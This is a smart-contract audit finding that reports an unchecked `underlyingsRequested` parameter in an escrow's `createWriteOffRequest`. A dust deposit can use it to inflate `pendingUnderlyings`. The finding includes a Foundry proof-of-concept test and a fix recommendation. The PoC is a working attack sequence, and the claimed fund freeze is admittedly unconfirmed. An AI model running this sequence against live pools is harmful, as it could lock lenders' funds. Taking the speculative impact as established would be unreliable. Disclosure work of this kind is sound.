### Title
Unbounded `underlyingsRequested` lets any tranche holder inflate `pendingUnderlyings` and freeze pool liquidity - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` accepts an arbitrary `underlyingsRequested` value from any caller and adds it verbatim into the global `pendingUnderlyings` accumulator, backed by only a dust amount of escrowed tranche tokens. Like the Spring AMQP bug where an attacker-supplied object is blindly processed by `toString()`, the escrow blindly trusts attacker-supplied accounting data and folds it into pool-wide state that `IdleCDOEpochVariant` reads when settling write-offs and sizing reserved liquidity.

### Finding Description
In `createWriteOffRequest` (`contracts/IdleCreditVaultWriteOffEscrow.sol:86-102`), the only requirements are `isEpochRunning()` and `amount != 0`. `underlyingsRequested` is unchecked: [1](#0-0) 

There is no relationship enforced between `tranches` deposited and `underlyings` requested — a rational lender would request roughly the virtual-price value of their tranches, but the contract accepts `underlyingsRequested = type(uint256).max / 2` with `amount = 1 wei`. The aggregate `pendingUnderlyings` is consumed by `IdleCDOEpochVariant` in the `writeOffDeposit` path (the escrow is wired into the CDO at `contracts/IdleCDOEpochVariant.sol`), where pending write-off underlyings are treated as a real liability/reservation against the pool's assets.

A fulfiller can only clear a request by paying the full `currentRequest.underlyings` (`fullfillWriteOffRequest` reverts on underpayment at line 129), so an inflated request is practically impossible for the honest borrower to fulfill — it sits in `pendingUnderlyings` until the attacker chooses to delete it.

### Impact Explanation
The invariant broken is fair accounting: aggregate pending write-off liabilities are supposed to reflect genuine lender exit demand, but they become attacker-controlled. Where `IdleCDOEpochVariant`/`IdleCreditVault` treat `pendingUnderlyings` as reserved value during the running epoch (and the epoch-end settlement), an inflated figure causes the pool to over-reserve: `availableToBorrow`-style capacity shrinks and withdraw fulfillment is blocked, producing temporary freezing of all lenders' funds for as long as the attacker keeps the request open. Cost to the attacker is a dust tranche deposit (recoverable via `deleteWriteOffRequest`), so the freeze is essentially free and repeatable across epochs. If `pendingUnderlyings` is instead netted against contract value at epoch close, an attacker who times `deleteWriteOffRequest` around `stopEpoch` can swing the reserved liability and distort the loss/interest basis passed into `_updateAccounting`.

### Likelihood Explanation
Attacker needs only a KYC-passing wallet (or any tranche holder per the threat model) and 1 wei of tranche tokens. The attack is available in every running epoch, requires no privileged role, and is fully reversible for the attacker. The residual uncertainty is the exact accounting weight `pendingUnderlyings` carries inside `IdleCDOEpochVariant.writeOffDeposit` — I confirmed the escrow is referenced there but could not fully trace whether the reservation gates liquidity, is only checked at write-off settlement, or both. If it is only consulted when the borrower calls `writeOffDeposit`, impact degrades to a griefing/DoS on that settlement and would fall under the rejected "DoS without fund impact" class.

### Recommendation
Cap `underlyingsRequested` to the redeemable value of the deposited tranches at request time (`amount * virtualPrice(tranche) / 1e18`), or compute pending liability lazily as `sum(tranches) * virtualPrice` instead of trusting a user-supplied number. Also allow fulfillers to partially fulfill or allow the CDO to cap the reservation at the tranches' fair value so a single malicious request cannot dominate `pendingUnderlyings`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
// Fork mainnet with the deployed IdleCDOEpochVariant + IdleCreditVaultWriteOffEscrow.

contract PendingUnderlyingsInflationTest is Test {
    // Deployed addresses from test/foundry/ProgrammableBorrowerCreditVault.t.sol setup
    IdleCDOEpochVariant cdo;
    IdleCreditVaultWriteOffEscrow escrow; // AA escrow
    IERC20 aaTranche;
    IERC20 underlying;

    function testInflatePendingUnderlyingsWithDust() external {
        address attacker = makeAddr("attacker");
        // during buffer: deposit minimum AA to obtain tranche tokens
        deal(address(underlying), attacker, 1e6);
        vm.startPrank(attacker);
        underlying.approve(address(cdo), 1e6);
        cdo.depositAA(1e6);

        // epoch running
        // attacker escrows 1 wei of tranche but requests ~ pool TVL in underlyings
        uint256 poolTVL = cdo.getContractValue();
        aaTranche.approve(address(escrow), 1);
        escrow.createWriteOffRequest(1, poolTVL * 100);
        vm.stopPrank();

        // pendingUnderlyings now exceeds the whole pool value at dust cost
        assertGt(escrow.pendingUnderlyings(), poolTVL);

        // Any accounting path that reserves pendingUnderlyings now sees
        // the pool as fully encumbered: borrows and withdraw fulfillment
        // are blocked until attacker calls deleteWriteOffRequest().
        // Borrower cannot clear it: fullfillWriteOffRequest reverts unless
        // _underlyings >= currentRequest.underlyings (line 129).

        // Attacker exits at will, keeping the freeze costless:
        vm.prank(attacker);
        escrow.deleteWriteOffRequest();
        assertEq(escrow.pendingUnderlyings(), 0);
    }
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```
